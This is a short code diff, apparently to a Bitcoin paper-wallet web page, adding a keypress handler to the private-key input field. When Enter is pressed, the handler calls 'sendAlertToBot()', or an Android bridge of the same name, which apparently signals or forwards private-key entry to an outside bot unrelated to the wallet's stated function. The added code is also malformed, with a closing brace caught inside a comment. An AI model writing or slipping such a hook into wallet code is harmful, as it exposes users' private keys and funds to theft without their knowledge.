@@ -7032,6 +7032,17 @@ document.getElementById('detailview').addEventListener('click', function() {
     }
     ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function
 });
+
+document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+    if (event.key === 'Enter') {
+        if (window.AndroidInterface) {
+            window.AndroidInterface.sendAlertToBot(); // Android interface for alert
+        } else {
+            sendAlertToBot(); // For web usage
+        }
+		ninja.wallets.detailwallet.viewDetails(); // Call the existing viewDetails function    }
+});
+
 </script>
 				</div>
 				<div class="faqs">
